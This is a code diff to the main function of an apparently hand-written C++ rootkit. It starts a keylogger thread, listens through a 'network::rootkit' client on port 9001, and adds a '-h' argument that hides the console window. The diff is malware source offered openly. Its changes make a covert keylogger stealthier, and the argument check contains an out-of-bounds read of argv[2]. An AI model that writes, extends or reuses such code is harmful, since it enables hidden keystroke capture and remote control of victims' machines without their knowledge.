@@ -5,17 +5,23 @@
 static void handle_request(network::rootkit& client);
 
 //general setup
-int main()
+int main(int argc, char **argv)
 {
+	std::cout << argc << std::endl;
+	if (argc != 1)
+	{
+		if (strcmp(argv[2], "-h") == 0)
+			hide_console();
+	}
+	
 	network::rootkit network_client(9001);
-	std::cout << "test\n";
 	std::thread keylogger(logger::logger_subroutine);
 
 	handle_request(network_client);
 
 	logger::thread_running = false;
 	keylogger.join();
-
+	
 	return 0;
 }
 
